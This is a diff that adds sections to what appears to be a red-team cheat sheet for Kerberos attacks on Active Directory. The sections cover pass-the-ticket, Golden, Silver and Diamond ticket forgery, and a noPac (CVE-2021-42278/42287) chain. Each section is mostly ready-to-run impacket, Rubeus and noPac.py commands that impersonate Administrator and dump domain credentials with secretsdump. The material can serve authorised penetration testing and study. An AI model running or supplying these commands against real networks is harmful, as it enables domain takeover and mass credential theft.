@@ -58,6 +58,88 @@ impacket-GetNPUsers '<dom>/' -dc-ip <DC> -usersfile users.txt -format hashcat -o
 # Crack: hashcat -m 18200 asrep.hash wordlist.txt
 ```
 
+## Pass-the-Ticket (PtT)
+Use an existing `.ccache` or `.kirbi` ticket to authenticate without knowing
+the password. Any impacket tool accepts `-k -no-pass` once the ccache is set.
+```bash
+# Convert kirbi if needed
+impacket-ticketConverter ticket.kirbi ticket.ccache
+export KRB5CCNAME=/path/to/ticket.ccache
+# Use with any impacket tool
+impacket-psexec '<dom>/<user>@<target>' -k -no-pass
+impacket-secretsdump '<dom>/<user>@<target>' -k -no-pass
+impacket-smbclient '<dom>/<user>@<target>' -k -no-pass
+```
+
+## Golden Ticket
+Forge a TGT for any user using the `krbtgt` NTLM hash (obtained via DCSync
+or SAM dump on a DC). Grants domain-wide access as any principal.
+```bash
+# Forge TGT as Administrator (need: domain SID + krbtgt hash)
+impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <S-1-5-21-...> \
+  -domain <dom> Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-secretsdump '<dom>/Administrator@<DC>' -k -no-pass
+# Rubeus (from Windows):
+# Rubeus.exe golden /rc4:<KRBTGT_NTLM> /sid:<DOMAIN_SID> /user:Administrator /ptt
+```
+
+## Silver Ticket
+Forge a TGS for a specific service using that service account's NTLM hash.
+No contact with the DC needed — useful when only one service is the target.
+```bash
+# Forge TGS for CIFS (file shares) on a target host
+impacket-ticketer -nthash <SVC_NTLM> -domain-sid <S-1-5-21-...> \
+  -domain <dom> -spn cifs/<target>.<dom> Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-smbclient '<dom>/Administrator@<target>' -k -no-pass
+
+# Common SPNs: cifs/ (SMB), HTTP/ (web), MSSQLSvc/ (SQL), HOST/ (WMI/PSRemoting)
+# Rubeus: Rubeus.exe silver /rc4:<HASH> /sid:<SID> /service:cifs/<host> /user:Administrator /ptt
+```
+
+## Diamond Ticket
+Modify a legitimately-requested TGT to add a privileged PAC. Harder to detect
+than a Golden Ticket because the ticket was issued by a real KDC.
+```bash
+# Rubeus (from Windows) — decrypt a real TGT, edit the PAC, re-encrypt:
+# Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:<user> /password:<pass> \
+#   /enctype:aes256 /domain:<dom> /dc:<DC> /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
+
+# From Linux with impacket-ticketer + AES key:
+impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <S-1-5-21-...> \
+  -domain <dom> -extra-pac Administrator
+```
+
+## noPac / sAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287)
+Rename a machine account to match a DC's sAMAccountName (without the `$`),
+request a TGT, rename back, then request a TGS — the KDC issues a ticket
+for the DC because the sAMAccountName matched at TGT time. Instant DA.
+```bash
+# All-in-one with noPac.py:
+python3 noPac.py '<dom>/<user>:<pass>' -dc-ip <DC> -dc-host <DC-HOSTNAME> \
+  --impersonate Administrator -dump
+
+# Manual steps with impacket:
+# 1. Create or use a machine account (addcomputer.py)
+impacket-addcomputer '<dom>/<user>:<pass>' -computer-name 'FAKEMACH$' \
+  -computer-pass 'Passw0rd!' -dc-ip <DC>
+# 2. Rename machine to DC's name (drop the $)
+impacket-renameMachine '<dom>/<user>:<pass>' -current-name 'FAKEMACH$' \
+  -new-name '<DC-NAME>' -dc-ip <DC>
+# 3. Get TGT as the renamed machine
+impacket-getTGT '<dom>/<DC-NAME>:Passw0rd!' -dc-ip <DC>
+# 4. Rename back
+impacket-renameMachine '<dom>/<user>:<pass>' -current-name '<DC-NAME>' \
+  -new-name 'FAKEMACH$' -dc-ip <DC>
+# 5. Get TGS (S4U2self) — KDC resolves to the real DC
+export KRB5CCNAME='<DC-NAME>.ccache'
+impacket-getST '<dom>/<DC-NAME>' -spn 'cifs/<DC-FQDN>' \
+  -impersonate Administrator -k -no-pass -dc-ip <DC>
+export KRB5CCNAME=Administrator@cifs_<DC-FQDN>@<DOM>.ccache
+impacket-secretsdump '<dom>/Administrator@<DC>' -k -no-pass
+```
+
 ## After reboots
 ccaches go stale, accounts may revert to tombstoned. Re-mint tickets rather
 than debugging stale ones. Re-validate the credential chain from the start.
